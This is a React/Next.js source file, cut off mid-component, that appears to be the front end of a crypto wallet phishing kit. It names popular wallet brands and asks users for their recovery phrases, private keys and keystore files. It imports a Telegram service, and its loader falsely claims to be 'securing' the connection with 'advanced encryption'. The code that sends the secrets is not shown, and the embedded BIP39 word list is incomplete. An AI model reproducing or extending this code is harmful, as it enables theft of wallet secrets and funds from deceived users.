'use client';

import { useState, useEffect, useRef } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { ArrowLeft, Key, FileText, Shield, Wallet, CheckCircle, AlertCircle, Loader2, Cpu, ShieldCheck, Lock } from 'lucide-react';
import { useWallet } from '@/components/context/WalletContext';
import { Wallet as WalletType, ConnectedWallet } from '@/libs/types/wallets';
import { TelegramService } from '@/libs/service/telegramService';
import WalletIcon from '@/components/logic/WalletIcons';

const WALLETS: WalletType[] = [
  {
    id: 'metamask',
    name: 'MetaMask',
    icon: '',
    colors: {
      primary: '#F6851B',
      secondary: '#E2761B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'walletconnect',
    name: 'WalletConnect',
    icon: '',
    colors: {
      primary: '#3B99FC',
      secondary: '#2A85FF',
      text: '#FFFFFF'
    }
  },
  {
    id: 'coinbase',
    name: 'Coinbase',
    icon: '',
    colors: {
      primary: '#0052FF',
      secondary: '#0042D6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'trustwallet',
    name: 'Trust Wallet',
    icon: '',
    colors: {
      primary: '#3375BB',
      secondary: '#2A65A6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'phantom',
    name: 'Phantom',
    icon: '',
    colors: {
      primary: '#4B49AC',
      secondary: '#3A3897',
      text: '#FFFFFF'
    }
  },
  {
    id: 'ledger',
    name: 'Ledger',
    icon: '',
    colors: {
      primary: '#ededed',
      secondary: '#fafafa',
      text: '#FFFFFF'
    }
  },
  {
    id: 'trezor',
    name: 'Trezor',
    icon: '',
    colors: {
      primary: '#00B45A',
      secondary: '#009C4D',
      text: '#FFFFFF'
    }
  },
  {
    id: 'binance',
    name: 'Binance',
    icon: '',
    colors: {
      primary: '#1a1a1a',
      secondary: '#232323',
      text: '#000000'
    }
  },
  {
    id: 'exodus',
    name: 'Exodus',
    icon: '',
    colors: {
      primary: '#1C1C1C',
      secondary: '#2D2D2D',
      text: '#FFFFFF'
    }
  },
  {
    id: 'argent',
    name: 'Argent',
    icon: '',
    colors: {
      primary: '#FF875B',
      secondary: '#FF6B3B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'rainbow',
    name: 'Rainbow',
    icon: '',
    colors: {
      primary: '#001A72',
      secondary: '#002EB5',
      text: '#FFFFFF'
    }
  },
  {
    id: 'zerion',
    name: 'Zerion',
    icon: '',
    colors: {
      primary: '#2962EF',
      secondary: '#1A51DF',
      text: '#FFFFFF'
    }
  },
  {
    id: 'brave',
    name: 'Brave',
    icon: '',
    colors: {
      primary: '#FB542B',
      secondary: '#E63E1C',
      text: '#FFFFFF'
    }
  },
  {
    id: 'ambire',
    name: 'Ambire',
    icon: '',
    colors: {
      primary: '#FF6B35',
      secondary: '#E55A2B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'leap',
    name: 'Leap',
    icon: '',
    colors: {
      primary: '#00DC82',
      secondary: '#00C274',
      text: '#FFFFFF'
    }
  },
  {
    id: 'magic eden',
    name: 'Magic Eden',
    icon: '',
    colors: {
      primary: '#000000',
      secondary: '#333333',
      text: '#FFFFFF'
    }
  },
  {
    id: 'onto',
    name: 'ONTO',
    icon: '',
    colors: {
      primary: '#00A3FF',
      secondary: '#008CE6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'safe',
    name: 'Safe',
    icon: '',
    colors: {
      primary: '#12FF80',
      secondary: '#00E572',
      text: '#000000'
    }
  },
  {
    id: 'solflare',
    name: 'Solflare',
    icon: '',
    colors: {
      primary: '#9945FF',
      secondary: '#7C36CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'torus',
    name: 'Torus',
    icon: '',
    colors: {
      primary: '#0364FF',
      secondary: '#0252CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'web3auth',
    name: 'Web3Auth',
    icon: '',
    colors: {
      primary: '#0364FF',
      secondary: '#0252CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'other',
    name: 'Other Wallet',
    icon: '',
    colors: {
      primary: '#6B7280',
      secondary: '#4B5563',
      text: '#FFFFFF'
    }
  }
];

// Enhanced Validation functions with REAL BIP39 word validation
const BIP39_WORDS = [
  'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract',
  'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid',
  'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual',
  // Add more BIP39 words here - this is a small sample
  'baby', 'back', 'bad', 'bag', 'balance', 'ball', 'bamboo', 'banana',
  'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 'basic', 'basket',
  'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before',
  'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit',
  'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike',
  'bind', 'biology', 'bird', 'birth', 'bitter', 'black', 'blade', 'blame',
  'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom', 'blouse',
  'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb',
  'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss',
  'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass',
  'brave', 'bread', 'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring',
  'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown', 'brush',
  'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle',
  'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter',
  'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake',
  'call', 'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy',
  'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital', 'captain', 'car',
  'carbon', 'card', 'cargo', 'carpet', 'carry', 'cart', 'case', 'cash',
  'casino', 'castle', 'casual', 'cat', 'catch', 'category', 'cattle', 'caught',
  'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century',
  'ceremony', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter',
  'charge', 'chase', 'chat', 'cheap', 'check', 'cheek', 'cheese', 'chef',
  'cherry', 'chest', 'chicken', 'chief', 'child', 'chimney', 'choice', 'choose',
  'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle', 'citizen',
  'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean',
  'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip',
  'clock', 'clog', 'close', 'cloth', 'cloud', 'clown', 'club', 'clump',
  'cluster', 'clutch', 'coach', 'coast', 'coconut', 'code', 'coffee', 'coil',
  'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort', 'comic',
  'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider',
  'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core',
  'corn', 'correct', 'cost', 'cotton', 'couch', 'country', 'couple', 'course',
  'cousin', 'cover', 'coyote', 'crack', 'cradle', 'craft', 'cram', 'crane',
  'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek', 'crew',
  'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd',
  'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal',
  'cube', 'culture', 'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve',
  'cushion', 'custom', 'cute', 'cycle', 'dad', 'damage', 'damp', 'dance',
  'danger', 'daring', 'dark', 'dash', 'date', 'daughter', 'dawn', 'day',
  'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate',
  'decrease', 'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver',
  'demand', 'demise', 'denial', 'dentist', 'deny', 'depart', 'depend', 'deposit',
  'depth', 'deputy', 'derive', 'describe', 'desert', 'design', 'desk', 'despair',
  'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial',
  'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity',
  'dilemma', 'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease',
  'dish', 'dismiss', 'disorder', 'display', 'distance', 'divert', 'divide', 'divorce',
  'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain', 'donate',
  'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'draft', 'dragon',
  'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink',
  'drip', 'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune',
  'during', 'dust', 'dutch', 'duty', 'dwarf', 'dynamic', 'eager', 'eagle',
  'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo', 'ecology',
  'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either',
  'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite',
  'else', 'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empower',
  'empty', 'enable', 'enact', 'end', 'endless', 'endorse', 'enemy', 'energy',
  'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough', 'enrich',
  'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal',
  'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape',
  'essay', 'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke',
  'evolve', 'exact', 'example', 'exceed', 'excel', 'exception', 'excess', 'exchange',
  'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile',
  'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain', 'expose',
  'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty',
  'fade', 'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous',
  'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father',
  'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed',
  'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few', 'fiber',
  'fiction', 'field', 'figure', 'file', 'film', 'filter', 'final', 'find',
  'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal', 'fish',
  'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor',
  'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid',
  'flush', 'fly', 'foam', 'focus', 'fog', 'foil', 'fold', 'follow',
  'food', 'foot', 'force', 'foreign', 'forest', 'forget', 'fork', 'fortune',
  'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile', 'frame',
  'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown',
  'frozen', 'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future',
  'gadget', 'gain', 'galaxy', 'gallery', 'game', 'gap', 'garage', 'garbage',
  'garden', 'garlic', 'garment', 'gas', 'gasp', 'gate', 'gather', 'gauge',
  'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture', 'ghost',
  'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad',
  'glance', 'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory',
  'glove', 'glow', 'glue', 'goat', 'goddess', 'gold', 'good', 'goose',
  'gorilla', 'gospel', 'gossip', 'govern', 'gown', 'grab', 'grace', 'grain',
  'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid', 'grief',
  'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guess', 'guide',
  'guilt', 'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer',
  'hamster', 'hand', 'happy', 'harbor', 'hard', 'harsh', 'harvest', 'hat',
  'have', 'hawk', 'hazard', 'head', 'health', 'heart', 'heavy', 'hedgehog',
  'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden', 'high',
  'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold',
  'hole', 'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn',
  'horror', 'horse', 'hospital', 'host', 'hotel', 'hour', 'hover', 'hub',
  'huge', 'human', 'humble', 'humor', 'hundred', 'hungry', 'hunt', 'hurdle',
  'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea', 'identify',
  'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense',
  'immune', 'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income',
  'increase', 'index', 'indicate', 'indoor', 'industry', 'infant', 'inflict', 'inform',
  'inhale', 'inherit', 'initial', 'inject', 'injury', 'inmate', 'inner', 'innocent',
  'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install', 'intact',
  'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate',
  'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous',
  'jeans', 'jelly', 'jewel', 'job', 'join', 'joke', 'journey', 'joy',
  'judge', 'juice', 'jump', 'jungle', 'junior', 'junk', 'just', 'kangaroo',
  'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney', 'kind',
  'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee',
  'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady',
  'lake', 'lamp', 'language', 'laptop', 'large', 'later', 'latin', 'laugh',
  'laundry', 'lava', 'law', 'lawn', 'lawsuit', 'layer', 'lazy', 'leader',
  'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal', 'legend',
  'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter',
  'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light',
  'like', 'limb', 'limit', 'link', 'lion', 'liquid', 'list', 'little',
  'live', 'lizard', 'load', 'loan', 'lobster', 'local', 'lock', 'logic',
  'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love', 'loyal',
  'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine',
  'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make',
  'mammal', 'man', 'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple',
  'marble', 'march', 'margin', 'marine', 'market', 'marriage', 'mask', 'mass',
  'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum', 'maze',
  'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody',
  'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit',
  'merry', 'mesh', 'message', 'metal', 'method', 'middle', 'midnight', 'milk',
  'million', 'mimic', 'mind', 'minimum', 'minor', 'minute', 'miracle', 'mirror',
  'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile', 'model',
  'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon',
  'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain',
  'mouse', 'move', 'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle',
  'museum', 'mushroom', 'music', 'must', 'mutual', 'myself', 'mystery', 'myth',
  'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near',
  'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest',
  'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night',
  'noble', 'noise', 'nominee', 'noodle', 'normal', 'north', 'nose', 'notable',
  'note', 'nothing', 'notice', 'novel', 'now', 'nuclear', 'number', 'nurse',
  'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain',
  'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office',
  'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once',
  'one', 'onion', 'online', 'only', 'open', 'opera', 'opinion', 'oppose',
  'option', 'orange', 'orbit', 'orchard', 'order', 'ordinary', 'organ', 'orient',
  'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output', 'outside',
  'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone',
  'pact', 'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel',
  'panic', 'panther', 'paper', 'parade', 'parent', 'park', 'parrot', 'party',
  'pass', 'patch', 'path', 'patient', 'patrol', 'pattern', 'pause', 'pave',
  'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen', 'penalty',
  'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone',
  'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig',
  'pigeon', 'pill', 'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch',
  'pizza', 'place', 'planet', 'plastic', 'plate', 'play', 'player', 'pleasure',
  'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar',
  'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position',
  'possible', 'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice',
  'praise', 'predict', 'prefer', 'prepare', 'present', 'pretty', 'prevent', 'price',
  'pride', 'primary', 'print', 'priority', 'prison', 'private', 'prize', 'problem',
  'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property',
  'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp',
  'pulse', 'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose',
  'purse', 'push', 'put', 'puzzle', 'pyramid', 'quality', 'quantum', 'quarter',
  'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon', 'race',
  'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp',
  'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven',
  'raw', 'razor', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall',
  'receive', 'recipe', 'record', 'recycle', 'reduce', 'reflect', 'reform', 'refuse',
  'region', 'regret', 'regular', 'reject', 'relax', 'release', 'relief', 'rely',
  'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen',
  'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist',
  'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reunion', 'reveal',
  'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride',
  'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot', 'rip', 'ripe',
  'rise', 'risk', 'rival', 'river', 'road', 'roast', 'robot', 'robust',
  'rocket', 'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough',
  'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run',
  'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad',
  'salmon', 'salon', 'salt', 'same', 'sample', 'sand', 'satisfy', 'satoshi',
  'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scatter',
  'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap',
  'screen', 'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second',
  'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell',
  'seminar', 'senior', 'sense', 'sentence', 'series', 'service', 'session', 'settle',
  'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell',
  'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe',
  'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shy',
  'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk',
  'silly', 'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister',
  'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill', 'skin',
  'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide',
  'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart',
  'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow',
  'soap', 'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier',
  'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry', 'sort',
  'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial',
  'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice',
  'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon',
  'sport', 'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze',
  'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp', 'stand',
  'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo',
  'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story',
  'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff',
  'stumble', 'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden',
  'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny', 'sunset',
  'super', 'supply', 'support', 'sure', 'surface', 'surge', 'surprise', 'surround',
  'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear',
  'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom',
  'syrup', 'system', 'table', 'tackle', 'tag', 'tail', 'talent', 'talk',
  'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi', 'teach',
  'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test',
  'text', 'thank', 'that', 'theme', 'then', 'theory', 'there', 'they',
  'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder',
  'ticket', 'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip',
  'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler', 'toe',
  'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight',
  'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise',
  'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track',
  'trade', 'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel',
  'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick', 'trigger',
  'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet',
  'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel',
  'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist',
  'two', 'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle',
  'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'uniform', 'unique',
  'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update',
  'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage',
  'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum',
  'vague', 'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various',
  'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue', 'verb',
  'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious',
  'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus',
  'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void',
  'volcano', 'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk',
  'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash', 'wasp',
  'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'weary', 'weather',
  'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale',
  'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide',
  'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing',
  'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness',
  'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world',
  'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong',
  'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero',
  'zone', 'zoo'
];

const validateMnemonic = (phrase: string): {isValid: boolean; message: string} => {
  const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
  
  console.log('🔤 Validating mnemonic:', { wordCount: words.length, words });
  
  if (words.length === 0) {
    return { isValid: false, message: '❌ Please enter a recovery phrase' };
  }
  
  if (words.length !== 12 && words.length !== 24) {
    return { 
      isValid: false, 
      message: `❌ Invalid phrase length: ${words.length} words. Must be exactly 12 or 24 words.` 
    };
  }
  
  // Check if words are valid BIP39 words
  const invalidWords = words.filter(word => !BIP39_WORDS.includes(word.toLowerCase()));
  if (invalidWords.length > 0) {
    return { 
      isValid: false, 
      message: `❌ Invalid BIP39 words detected: ${invalidWords.slice(0, 3).join(', ')}...` 
    };
  }
  
  return { 
    isValid: true, 
    message: `✅ Valid ${words.length}-word BIP39 recovery phrase` 
  };
};

const validatePrivateKey = (key: string): {isValid: boolean; message: string} => {
  const cleanedKey = key.trim().replace(/^0x/, '');
  
  console.log('🔑 Validating private key:', { length: cleanedKey.length });
  
  if (cleanedKey.length === 0) {
    return { isValid: false, message: '❌ Please enter a private key' };
  }
  
  if (!/^[0-9a-fA-F]+$/.test(cleanedKey)) {
    return { 
      isValid: false, 
      message: '❌ Invalid format. Must be 64 hexadecimal characters (0-9, a-f).' 
    };
  }
  
  if (cleanedKey.length !== 64) {
    return { 
      isValid: false, 
      message: `❌ Invalid length: ${cleanedKey.length}/64 characters.` 
    };
  }
  
  return { isValid: true, message: '✅ Valid 64-character private key' };
};

const validateKeystore = (keystore: string): {isValid: boolean; message: string} => {
  console.log('📁 Validating keystore JSON');
  
  if (keystore.trim().length === 0) {
    return { isValid: false, message: '❌ Please enter keystore JSON' };
  }
  
  try {
    const json = JSON.parse(keystore);
    
    if (json && typeof json === 'object') {
      const hasCrypto = 'crypto' in json || 'Crypto' in json;
      const hasVersion = 'version' in json;
      
      if (hasCrypto && hasVersion) {
        return { isValid: true, message: '✅ Valid keystore JSON (Version 3)' };
      } else if (hasCrypto) {
        return { isValid: true, message: '✅ Valid keystore format with crypto data' };
      } else {
        return { isValid: false, message: '❌ Invalid: Missing crypto data in keystore' };
      }
    } else {
      return { isValid: false, message: '❌ Invalid JSON structure' };
    }
  } catch (error) {
    return { isValid: false, message: '❌ Invalid JSON format - cannot parse' };
  }
};

// Enhanced Beautiful Loading Animation Component
function ValidationLoader({ isOpen, progress }: { isOpen: boolean; progress: number }) {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4 backdrop-blur-xl">
      <div className="bg-linear-to-br from-gray-900 via-gray-800 to-black rounded-3xl p-8 max-w-md w-full border border-gray-700 shadow-2xl relative overflow-hidden">
        {/* Animated background elements */}
        <div className="absolute inset-0 opacity-10">
          <div className="absolute top-10 left-10 w-20 h-20 bg-blue-500 rounded-full blur-xl animate-pulse"></div>
          <div className="absolute bottom-10 right-10 w-16 h-16 bg-purple-500 rounded-full blur-xl animate-pulse delay-1000"></div>
        </div>
        
        {/* Main Content */}
        <div className="relative z-10 text-center">
          {/* Animated Icon */}
          <div className="relative inline-block mb-6">
            <div className="w-24 h-24 bg-linear-to-r from-blue-500 via-purple-500 to-pink-500 rounded-full flex items-center justify-center animate-pulse shadow-2xl">
              <div className="w-20 h-20 bg-gray-900 rounded-full flex items-center justify-center">
                <div className="relative">
                  <Cpu className="w-10 h-10 text-white animate-pulse" />
                  <div className="absolute -inset-2 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
                </div>
              </div>
            </div>
            
            {/* Floating particles */}
            <div className="absolute -top-2 -right-2 w-6 h-6 bg-green-400 rounded-full animate-bounce shadow-lg"></div>
            <div className="absolute -bottom-2 -left-2 w-5 h-5 bg-cyan-400 rounded-full animate-bounce shadow-lg" style={{ animationDelay: '0.3s' }}></div>
            <div className="absolute top-4 -right-4 w-4 h-4 bg-yellow-400 rounded-full animate-bounce shadow-lg" style={{ animationDelay: '0.6s' }}></div>
          </div>
          
          <h2 className="text-3xl font-bold text-white mb-3 bg-linear-to-r from-white via-blue-200 to-purple-200 bg-clip-text">
            Securing Connection
          </h2>
          <p className="text-gray-300 text-sm mb-6">
            Validating your credentials with advanced encryption
          </p>

          {/* Enhanced Progress Bar */}
          <div className="mb-8">
            <div className="flex justify-between text-sm text-gray-400 mb-3">
              <span>Security Validation</span>
              <span className="font-mono">{Math.round(progress)}%</span>
            </div>
            <div className="w-full bg-gray-800 rounded-full h-3 shadow-inner">
              <div 
                className="bg-linear-to-r from-green-400 via-blue-500 to-purple-600 h-3 rounded-full transition-all duration-300 ease-out shadow-lg"
                style={{ width: `${progress}%` }}
              >
                <div className="w-full h-full bg-white opacity-20 animate-pulse rounded-full"></div>
              </div>
            </div>
          </div>

          {/* Enhanced Steps with Icons */}
          <div className="space-y-4 mb-8">
            <div className={`flex items-center space-x-4 p-3 rounded-xl transition-all duration-300 ${
              progress >= 33 ? 'bg-green-500/20 border border-green-500/30' : 'bg-gray-800/50'
            }`}>
              <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                progress >= 33 ? 'bg-green-500 text-white shadow-lg' : 'bg-gray-700 text-gray-400'
              }`}>
